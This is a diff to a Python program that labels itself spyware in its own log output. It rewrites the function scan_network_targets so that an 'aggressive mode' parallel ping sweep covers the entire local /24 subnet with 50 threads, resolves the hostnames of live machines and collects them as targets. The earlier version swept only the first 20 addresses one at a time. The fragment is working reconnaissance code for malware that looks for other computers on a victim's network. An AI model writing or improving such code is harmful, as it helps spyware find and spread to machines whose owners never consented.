@@ -74,7 +74,7 @@ def scan_network_targets():
             print(f"[Spyware]   ARP scan failed: {e}")
         
         # Method 2b: Scan local subnet using ping sweep
-        print("[Spyware] Scanning local subnet...")
+        print("[Spyware] Scanning local subnet (aggressive mode)...")
         try:
             # Extract subnet from local IP (e.g., 192.168.1.x)
             subnet_parts = local_ip.split('.')
@@ -82,29 +82,36 @@ def scan_network_targets():
                 subnet = '.'.join(subnet_parts[:3])
                 print(f"[Spyware]   Scanning subnet: {subnet}.0/24")
                 
-                # Quick ping sweep (first 20 IPs for speed)
-                for i in range(1, 21):
-                    target_ip = f"{subnet}.{i}"
-                    if target_ip != local_ip:
-                        try:
-                            # Quick ping with 1 second timeout
-                            ping_result = subprocess.run(['ping', '-n', '1', '-w', '500', target_ip],
-                                                        capture_output=True, text=True, timeout=2)
-                            if 'Reply from' in ping_result.stdout or 'TTL=' in ping_result.stdout:
-                                print(f"[Spyware]   Host alive: {target_ip}")
-                                # Try to resolve hostname
-                                try:
-                                    host = socket.gethostbyaddr(target_ip)[0]
-                                    host_short = host.split('.')[0]
-                                    if host_short not in computers:
-                                        computers.append(host_short)
-                                        print(f"[Spyware]   Hostname: {host_short}")
-                                except:
-                                    # Try direct IP access
-                                    if target_ip not in computers:
-                                        computers.append(target_ip)
-                        except:
-                            pass
+                def quick_ping(ip):
+                    """Quick ping check"""
+                    try:
+                        ping_result = subprocess.run(['ping', '-n', '1', '-w', '300', ip],
+                                                    capture_output=True, text=True, timeout=1)
+                        if 'Reply from' in ping_result.stdout or 'TTL=' in ping_result.stdout:
+                            return ip
+                    except:
+                        pass
+                    return None
+                
+                # Parallel ping sweep for entire subnet
+                with ThreadPoolExecutor(max_workers=50) as executor:
+                    target_ips = [f"{subnet}.{i}" for i in range(1, 255) if f"{subnet}.{i}" != local_ip]
+                    futures = {executor.submit(quick_ping, ip): ip for ip in target_ips}
+                    
+                    for future in as_completed(futures):
+                        result = future.result()
+                        if result:
+                            print(f"[Spyware]   Host alive: {result}")
+                            # Try to resolve hostname
+                            try:
+                                host = socket.gethostbyaddr(result)[0]
+                                host_short = host.split('.')[0]
+                                if host_short not in computers:
+                                    computers.append(host_short)
+                                    print(f"[Spyware]   Hostname: {host_short}")
+                            except:
+                                if result not in computers:
+                                    computers.append(result)
         except Exception as e:
             print(f"[Spyware]   Subnet scan failed: {e}")
         
